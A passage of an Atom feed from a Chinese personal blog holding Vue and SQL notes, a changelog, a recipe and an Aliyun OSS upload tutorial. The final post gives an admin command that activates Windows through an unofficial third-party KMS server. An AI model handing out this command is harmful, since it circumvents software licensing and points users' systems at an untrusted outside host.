class="string">&#x27;custom-event&#x27;</span>, <span class="string">&#x27;Hello, parent!&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在父组件中，可以通过 v-on 指令监听子组件触发的自定义事件，并在对应的方法中接收子组件传递的数据。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">child-component</span> @<span class="attr">custom-event</span>=<span class="string">&quot;handleEvent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">child-component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ChildComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./ChildComponent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ChildComponent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleEvent</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data) <span class="comment">// 输出：Hello, parent!</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上是 Vue 中组件传值的基本用法，希望对你有所帮助。</p><h3 id="三、v-if和v-show的区别"><a href="#三、v-if和v-show的区别" class="headerlink" title="三、v-if和v-show的区别"></a>三、v-if和v-show的区别</h3><p>v-if 和 v-show 都是 Vue 中用于控制元素显示和隐藏的指令，但它们的实现方式不同。</p><p>v-if 指令是将元素从 DOM 树中移除或添加，当条件为 false 时，元素会被移除，当条件为 true 时，元素会被添加到 DOM 树中。这意味着当条件为 false 时，元素的所有事件监听器和子组件都会被销毁，当条件为 true 时，元素的事件监听器和子组件会被重新创建。</p><p>v-show 指令是通过 CSS 样式控制元素的显示和隐藏，当条件为 false 时，元素的 display 样式设置为 none，当条件为 true 时，元素的 display 样式设置为原来的值。这意味着元素始终存在于 DOM 树中，不会被销毁和重新创建，但是会影响页面的渲染性能。</p><p>因此，如果需要频繁切换元素的显示和隐藏，可以使用 v-show，如果元素的显示和隐藏较少变化，可以使用 v-if。</p>]]></content>
    
    
    <summary type="html">java面试题及答案</summary>
    
    
    
    <category term="java" scheme="https://www.fomal.cc/categories/java/"/>
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/tags/java%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>欢迎来到我的博客</title>
    <link href="https://www.fomal.cc/posts/b250e9bb.html"/>
    <id>https://www.fomal.cc/posts/b250e9bb.html</id>
    <published>2023-08-13T12:26:46.076Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<!-- # 本地图片 --><!-- <img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /> --><h1 id="一起变强吧🚅"><a href="#一起变强吧🚅" class="headerlink" title="一起变强吧🚅"></a>一起变强吧🚅</h1><p><img src="https://w.wallhaven.cc/full/ex/wallhaven-exyp3k.jpg" alt="code"></p>]]></content>
    
    
    <summary type="html">欢迎来到我的博客</summary>
    
    
    
    <category term="公告" scheme="https://www.fomal.cc/categories/%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="日志" scheme="https://www.fomal.cc/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>更新日志</title>
    <link href="https://www.fomal.cc/posts/5a717bf0.html"/>
    <id>https://www.fomal.cc/posts/5a717bf0.html</id>
    <published>2023-08-13T12:26:46.073Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2022-12-1更新内容"><a href="#2022-12-1更新内容" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改博客音乐播放器，原网易云，现QQ音乐<br>2.因为收到大量广告评论，现关闭评论功能<br>3.更改网页图标<br>4.更改图片显示方式，增快读取速度。（但是因为使用vercel部署的原因，国内访问还是较慢，但是能接受，以后再想办法）</p><h3 id="2022-12-1更新内容-1"><a href="#2022-12-1更新内容-1" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改标签和分类<br>2.修补部分显示错误</p><h3 id="2023-1-12更新内容"><a href="#2023-1-12更新内容" class="headerlink" title="2023-1-12更新内容"></a>2023-1-12更新内容</h3><p>1.下线音乐播放器</p><h3 id="2023-1-12更新内容-1"><a href="#2023-1-12更新内容-1" class="headerlink" title="2023-1-12更新内容"></a>2023-1-12更新内容</h3><p>1.重新上线音乐播放器<br>2.首页底部增加音乐播放器<br>3.新增挂件<br>4.暂时下线github贡献图<br>5.修改dns，加速访问速度<br>6.白天模式和夜间模式切换时壁纸改变</p><h3 id="2023-4-24更新内容"><a href="#2023-4-24更新内容" class="headerlink" title="2023-4-24更新内容"></a>2023-4-24更新内容</h3><p>1.部分网页增加访问密码</p><h3 id="2023-4-25更新内容"><a href="#2023-4-25更新内容" class="headerlink" title="2023-4-25更新内容"></a>2023-4-25更新内容</h3><p>1.新增评论功能</p><h3 id="2023-5-16更新内容"><a href="#2023-5-16更新内容" class="headerlink" title="2023-5-16更新内容"></a>2023-5-16更新内容</h3><p>1.新增两个分类，目前分类比较复杂，后期还会做调整<br>2.新增gitee联系方式</p>]]></content>
    
    
    <summary type="html">记录博客的更新</summary>
    
    
    
    <category term="公告" scheme="https://www.fomal.cc/categories/%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="日志" scheme="https://www.fomal.cc/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>常用sql语句</title>
    <link href="https://www.fomal.cc/posts/6605dc2.html"/>
    <id>https://www.fomal.cc/posts/6605dc2.html</id>
    <published>2023-08-13T12:26:46.070Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<h5 id="展示所有数据库"><a href="#展示所有数据库" class="headerlink" title="展示所有数据库"></a>展示所有数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases</span><br></pre></td></tr></table></figure><h5 id="创建一个student-grade表"><a href="#创建一个student-grade表" class="headerlink" title="创建一个student_grade表"></a>创建一个student_grade表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student_grade(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">enligsh <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">math <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">chinese <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><em>此处enligsh为故意写错，方便下面修改示范</em></p><h5 id="插入两个数据"><a href="#插入两个数据" class="headerlink" title="插入两个数据"></a>插入两个数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student_grade ( id, NAME, enligsh, math, chinese )</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;李狗蛋&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;聪明的李某人&#x27;</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">99</span>);</span><br></pre></td></tr></table></figure><h5 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> student_grade</span><br></pre></td></tr></table></figure><p>此时发现enligsh拼写错误</p><h5 id="修改字段名"><a href="#修改字段名" class="headerlink" title="修改字段名"></a>修改字段名</h5><p>参考例句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;</span><br></pre></td></tr></table></figure><p>此处所用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE enligsh  english <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这个方法也可以用来修改指定字段的数据类型，<strong><em>但是修改字段类型需要保证改后的数据类型能兼容之前的数据</em></strong>，例如此处我修改name的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE name name <span class="type">VARCHAR</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">经常会用到，但是经常忘记的sql语句</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>菜谱</title>
    <link href="https://www.fomal.cc/posts/70a7eda9.html"/>
    <id>https://www.fomal.cc/posts/70a7eda9.html</id>
    <published>2023-08-13T12:26:45.879Z</published>
    <updated>2023-06-17T10:43:55.851Z</updated>
    
    <content type="html"><![CDATA[<h3 id="擂辣椒茄子皮蛋"><a href="#擂辣椒茄子皮蛋" class="headerlink" title="擂辣椒茄子皮蛋"></a>擂辣椒茄子皮蛋</h3><p>主料：茄子(1个)，皮蛋（2个)，辣椒（看个人，一般两个）</p><p>辅料：蒜，芝麻油</p><p>酱料：老抽（2勺），陈醋（2勺），蚝油（1勺），少量盐</p><p>步骤：</p><ol><li>茄子洗净去皮切成小粗条，放锅上去蒸</li><li>皮蛋剥壳切块</li><li>茄子蒸软后放入碗中</li><li>大蒜切粒</li><li>辣椒洗干净放入锅中加油煎软，撕去表皮</li><li>放放酱料一起捣烂</li></ol>]]></content>
    
    
    <summary type="html">这只是个测试文件</summary>
    
    
    
    <category term="菜谱" scheme="https://www.fomal.cc/categories/%E8%8F%9C%E8%B0%B1/"/>
    
    
    <category term="菜谱" scheme="https://www.fomal.cc/tags/%E8%8F%9C%E8%B0%B1/"/>
    
  </entry>
  
  <entry>
    <title>阿里云oss文件上传</title>
    <link href="https://www.fomal.cc/posts/8450d894.html"/>
    <id>https://www.fomal.cc/posts/8450d894.html</id>
    <published>2023-08-13T12:26:45.846Z</published>
    <updated>2023-07-03T14:46:19.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阿里云oss文件上传"><a href="#阿里云oss文件上传" class="headerlink" title="阿里云oss文件上传"></a>阿里云oss文件上传</h1><h3 id="所需依赖"><a href="#所需依赖" class="headerlink" title="所需依赖"></a>所需依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-oss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.10.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示"><a href="#其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示" class="headerlink" title="其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示"></a>其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aliyun:</span></span><br><span class="line">  <span class="attr">oss:</span></span><br><span class="line">    <span class="attr">file:</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">oss-cn-hangzhou.aliyuncs.com</span>   <span class="string">//</span> <span class="string">节点，此处为（华东1）杭州</span></span><br><span class="line">      <span class="attr">keyid:</span> <span class="string">LxxxxxxxxxxxxxW</span></span><br><span class="line">      <span class="attr">keysecret:</span> <span class="string">txxxxxxxxxxxRM</span></span><br><span class="line">      <span class="attr">bucketname:</span> <span class="string">leebook</span>     <span class="string">//</span> <span class="string">目标桶名称</span></span><br></pre></td></tr></table></figure><h3 id="编写OSS工具类OssUtils"><a href="#编写OSS工具类OssUtils" class="headerlink" title="编写OSS工具类OssUtils"></a>编写OSS工具类OssUtils</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ll.aliyunoss.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by a handsome man</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: mental_test</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/12/08/22:42</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 交给spring管理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OssUtils</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取配置文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.endpoint&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keyid&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keyid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keysecret&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keysecret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.bucketname&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String bucketname;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义公开静态常量</span></span><br><span class="line"><span class="comment">     * 当下面值初始化完成后接口会执行</span></span><br><span class="line"><span class="comment">     * 通过下面的公共方法就可以在别处引用变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String ENDPOINT;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_SECRET;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String BUCKET_NAME;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ENDPOINT = endpoint;</span><br><span class="line">        KEY_ID = keyid;</span><br><span class="line">        KEY_SECRET = keysecret;</span><br><span class="line">        BUCKET_NAME = bucketname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="具体执行代码"><a href="#具体执行代码" class="headerlink" title="具体执行代码"></a>具体执行代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">     <span class="comment">// 获取oss参数</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">endpoint</span> <span class="operator">=</span> OssUtils.ENDPOINT;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keyId</span> <span class="operator">=</span> OssUtils.KEY_ID;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keySecret</span> <span class="operator">=</span> OssUtils.KEY_SECRET;</span><br><span class="line">     <span class="type">String</span> <span class="variable">bucketName</span> <span class="operator">=</span> OssUtils.BUCKET_NAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">OSS</span> <span class="variable">ossClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OSSClientBuilder</span>().build(endpoint, keyId, keySecret);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 文件上传工作流</span></span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.getInputStream();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 获取文件名称</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment">// **若文件名重复，新的会自动覆盖旧的文件，所以需要对文件进行区分</span></span><br><span class="line">         <span class="comment">// 此处我用的是时间日期分类</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">datePath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DateTime</span>().toString(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">         <span class="comment">// 拼接</span></span><br><span class="line">         filename = datePath + filename;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 调用oss方法实现上传</span></span><br><span class="line">         <span class="comment">// 参数1：Bucket名称</span></span><br><span class="line">         <span class="comment">// 参数2：上传到oss的文件路径和文件名</span></span><br><span class="line">         <span class="comment">// 参数3： 上传文件输入流</span></span><br><span class="line">         ossClient.putObject(bucketName,filename,inputStream);</span><br><span class="line">         <span class="comment">// 关闭流</span></span><br><span class="line">         ossClient.shutdown();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 上传完文件后将文件路径返回</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;https://&quot;</span> + bucketName + <span class="string">&quot;.&quot;</span> + endpoint + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> url;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>如果是想直接获取返回地址，则可以用以下的方法,但是注意的是，<strong>这个方法必须设置过期时间</strong>，这里天坑！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile multipartFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">OSSClient</span> <span class="variable">ossClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OSSClient</span>(ENDPOINT, KEY_ID, KEY_SECRET);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multipartFile.getOriginalFilename();</span><br><span class="line">        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">suffixName</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">// 最后上传生成的文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">finalFileName</span> <span class="operator">=</span> System.currentTimeMillis() + <span class="string">&quot;&quot;</span> + <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextInt(<span class="number">0x0400</span>) + suffixName;</span><br><span class="line">        <span class="comment">// oss中的文件夹名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">objectName</span> <span class="operator">=</span> sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;/&quot;</span> + finalFileName;</span><br><span class="line">        <span class="comment">// 创建上传文件的元信息，可以通过文件元信息设置HTTP header(设置了才能通过返回的链接直接访问)。</span></span><br><span class="line">        <span class="type">ObjectMetadata</span> <span class="variable">objectMetadata</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMetadata</span>();</span><br><span class="line">        objectMetadata.setContentType(<span class="string">&quot;image/jpg&quot;</span>);</span><br><span class="line">        <span class="comment">// 文件上传</span></span><br><span class="line">        ossClient.putObject(BUCKET_NAME, objectName, <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(multipartFile.getBytes()),objectMetadata);</span><br><span class="line">        <span class="comment">// 设置URL过期时间为1小时。</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">expiration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + <span class="number">3600</span> * <span class="number">1000</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> ossClient.generatePresignedUrl(BUCKET_NAME, objectName, expiration).toString();</span><br><span class="line">        ossClient.shutdown();</span><br><span class="line">        <span class="keyword">return</span> url;</span><br></pre></td></tr></table></figure><p>此外，如果你把图片上传了oss,但是预览尺寸需要指定，则可以采用以下方法，此处设置的预览尺寸是高80宽80，可自行修改</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//y</span>our-bucket-name.oss-cn-hangzhou.aliyuncs.com<span class="regexp">/your-image.jpg?x-oss-process=image/</span>resize,m_fill,w_80,h_80</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">阿里云oss文件上传</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>windows激活</title>
    <link href="https://www.fomal.cc/posts/91cf1372.html"/>
    <id>https://www.fomal.cc/posts/91cf1372.html</id>
    <published>2023-08-13T12:26:45.842Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<p>用管理员权限打开DOS命令窗口，输入以下的命令即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slmgr /skms kms.v0v.bid &amp;&amp; slmgr /ato</span><br></pre></td></tr></table></figure><p>本人win10亲测有效，其他的版本暂时没试过</p>]]></content>
    
    
    <summary type="html">用命令将windows激活</summary>
    
    
    
    <category term="杂类" scheme="https://www.fomal.cc/categories/%E6%9D%82%E7%B1%BB/"/>
    
    
    <category term="电脑知识" scheme="https://www.fomal.cc/tags/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
</feed>
